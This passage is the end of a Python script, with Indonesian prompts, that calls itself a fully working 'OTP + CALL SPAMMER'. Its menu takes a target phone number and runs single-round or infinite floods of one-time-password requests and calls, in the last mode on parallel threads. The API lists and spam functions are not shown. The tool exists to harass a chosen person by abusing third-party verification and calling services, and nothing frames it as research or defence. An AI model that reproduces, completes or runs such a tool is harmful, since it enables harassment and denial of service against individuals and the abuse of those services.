                    print(f"{G}[{counter}] ✅ Call sent{RS}")
                else:
                    print(f"{R}[{counter}] ❌ Failed{RS}")
            except:
                print(f"{R}[{counter}] ❌ Error{RS}")
            time.sleep(random.uniform(1, 3))
    except KeyboardInterrupt:
        print(f"\n{C}Stopped! Total: {counter}{RS}")

# ================================================================
# ===== MAIN =====
# ================================================================

def main():
    print(f"""
{C}╔═══════════════════════════════════════════════════════════╗
║         🔥 OTP + CALL SPAMMER - FULL WORKING            ║
║         {len(ALL_OTP)} OTP API + {len(ALL_CALL)} CALL API                 ║
╚═══════════════════════════════════════════════════════════╝{RS}
    """)
    
    phone = input(f"{C}[?] Nomor target (08xx): {W}").strip()
    if not phone:
        print(f"{R}Nomor tidak boleh kosong!{RS}")
        return
    
    print(f"\n{C}┌─────────────────────────────────────────────────┐")
    print(f"{C}│{W}  PILIH MODE                                   {C}│")
    print(f"{C}├─────────────────────────────────────────────────┤")
    print(f"{C}│{W}  [1] OTP Spam (Single Round)                 {C}│")
    print(f"{C}│{W}  [2] Call Spam (Single Round)                {C}│")
    print(f"{C}│{W}  [3] OTP + Call Spam (Single Round)          {C}│")
    print(f"{C}│{W}  [4] OTP Spam (Infinite)                     {C}│")
    print(f"{C}│{W}  [5] Call Spam (Infinite)                    {C}│")
    print(f"{C}│{W}  [6] OTP + Call Spam (Infinite)              {C}│")
    print(f"{C}└─────────────────────────────────────────────────┘{RS}")
    
    choice = input(f"{C}[?] Pilih mode (1-6): {W}").strip()
    
    if choice == '1':
        spam_otp(phone, 10)
    elif choice == '2':
        spam_call(phone, 5)
    elif choice == '3':
        spam_otp(phone, 10)
        spam_call(phone, 5)
    elif choice == '4':
        spam_infinite_otp(phone, 5)
    elif choice == '5':
        spam_infinite_call(phone, 3)
    elif choice == '6':
        print(f"\n{R}🔥 INFINITE OTP + CALL SPAM{RS}")
        threading.Thread(target=spam_infinite_otp, args=(phone, 3), daemon=True).start()
        threading.Thread(target=spam_infinite_call, args=(phone, 2), daemon=True).start()
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{C}Stopped!{RS}")
    else:
        print(f"{R}Pilihan tidak valid!{RS}")

if __name__ == "__main__":
    main()
